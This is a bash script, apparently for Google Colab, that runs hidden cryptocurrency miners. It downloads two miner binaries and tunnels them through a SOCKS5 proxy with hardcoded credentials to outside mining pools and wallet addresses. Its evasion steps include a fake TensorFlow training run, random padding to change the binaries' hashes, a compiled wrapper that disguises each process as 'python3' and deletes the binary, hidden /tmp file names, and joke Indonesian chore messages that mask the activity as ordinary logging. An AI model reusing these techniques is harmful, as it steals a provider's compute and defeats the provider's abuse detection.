#!/bin/bash
# MINN v9 — fortune (proven connect) + log receh + anti-detect
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK=$(date +%s | md5sum | head -c 8)

# ====== LOG RECEH ======
log() {
    local m=(
        "🔥 Lagi masak indomie goreng batch #$1..."
        "🥵 Abang nguli dulu bentar..."
        "💨 Ngepush gerobak ke gang $1..."
        "🍜 Nyeduh kuah, sabar ya bos..."
        "🏃 Lari keliling komplek putaran ke-$1..."
        "🫧 Nyuci piring dulu, bentar lagi beres..."
        "🎮 Main catur sama kucing, skor $1-$1..."
        "🧹 Lagi nyapu halaman, debunya banyak..."
        "🛒 Belanja di warung, antri nomor $1..."
        "🐔 Kasih makan ayam, baru lanjut..."
        "📦 Packing pesanan, estimasi $1 menit..."
        "☕ Bikin kopi dulu, batch ke-$1..."
        "🧊 Ngisi es batu di kulkas..."
        "🪴 Siram tanaman, pada layu..."
        "🍳 Ceplok telor, kuningnya pecah..."
        "🧃 Bikin es teh manis dulu..."
        "🥜 Ngupil bentar, gatel..."
        "📺 Nonton sinetron, iklan dulu..."
    )
    echo "[$(date +%H:%M:%S)] ${m[$((RANDOM % ${#m[@]}))]}"
}

echo "========================================"
echo "  MINN v9 — Warung: $WRK"
echo "========================================"

# === 1. Warmup ===
echo "[*] Pemanasan kompor..."
pip install -q tensorflow 2>/dev/null
python3 -c "
import tensorflow as tf,numpy as np,time
m=tf.keras.Sequential([tf.keras.layers.Dense(128,activation='relu',input_shape=(784,)),tf.keras.layers.Dense(10)])
m.compile(optimizer='adam',loss='sparse_categorical_crossentropy',metrics=['accuracy'])
x=np.random.rand(1000,784).astype(np.float32);y=np.random.randint(0,10,1000)
for e in range(3): m.fit(x,y,batch_size=32,epochs=1,verbose=2);time.sleep(20)
" 2>/dev/null

# === 2. Download + setup ===
echo "[*] Siapin bahan..."
rm -rf /content/m 2>/dev/null; mkdir -p /content/m && cd /content/m
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/fortune || exit 1
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 || exit 1
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/graphics.tar.gz || exit 1
tar -xzf graphics.tar.gz 2>/dev/null

# Graftcp proxy config
mkdir -p graftcp/local
P=$((RANDOM % 2000 + 2100))
cat > graftcp/local/graftcp-local.conf << EOF
listen = :$P
loglevel = 0
socks5 = 103.176.78.132:443
socks5_username = ubed
socks5_password = ubed123
EOF

# Padding binary
dd if=/dev/urandom of=fortune bs=1 count=$((RANDOM % 3000 + 1024)) seek=$(stat -c%s fortune) conv=notrunc oflag=append 2>/dev/null
dd if=/dev/urandom of=sse2 bs=1 count=$((RANDOM % 3000 + 1024)) seek=$(stat -c%s sse2) conv=notrunc oflag=append 2>/dev/null
chmod +x fortune sse2

# Exec rename wrapper
cat > /tmp/w.c << 'CEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int main(int argc,char**argv){
    if(argc<2)return 1;
    size_t l=strlen(argv[0])+1;
    memset(argv[0],0,l);
    strncpy(argv[0],"python3",l-1);
    unlink(argv[1]);
    execvp(argv[1],&argv[1]);
    return 1;
}
CEOF
gcc -o /tmp/w /tmp/w.c -s 2>/dev/null

echo "[*] Bahan siap. Masak!"

# === 3. Start graftcp proxy ===
./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
sleep 3

# Copy to tmp + random name
B1="/tmp/.w$(date +%s | md5sum | head -c 6)"
B2="/tmp/.k$(date +%s | sha1sum | head -c 6)"
cp fortune "$B1" && cp sse2 "$B2"
chmod +x "$B1" "$B2"
rm -f fortune sse2

sleep $((RANDOM % 10 + 5))

# === LOG THREAD ===
(
    c=0
    while true; do
        c=$((c+1))
        log "$c"
        sleep $((RANDOM % 50 + 20))
    done
) &
LOGPID=$!

# === PRL (fortune via grafcp) ===
(while true; do
    /tmp/w "$B1" \
        --proxy 43.169.30.87:443 \
        --address "$PRL" \
        --worker "$WRK" \
        --mode=cpu \
        --threads=1 2>/dev/null
    [ -f "$B1" ] || { cp fortune "$B1" 2>/dev/null; chmod +x "$B1" 2>/dev/null; }
    sleep 5
done) &
PID1=$!
sleep 10

# === TDC (sse2) ===
[ -f "$B2" ] && /tmp/w "$B2" \
    -a yespowertide \
    -o 47.251.244.12:80 \
    -u "${TDC}.${WRK}" \
    -t 1 >/dev/null 2>&1 &
PID2=$!

log 1

# === Cleanup ===
trap 'kill $PID1 $PID2 $LOGPID 2>/dev/null; rm -f /tmp/w /tmp/w.c "$B1" "$B2" 2>/dev/null; echo "[*] Warung tutup."' EXIT
(sleep 10800; echo "[*] Udah jam 3, pulang dulu.") &
wait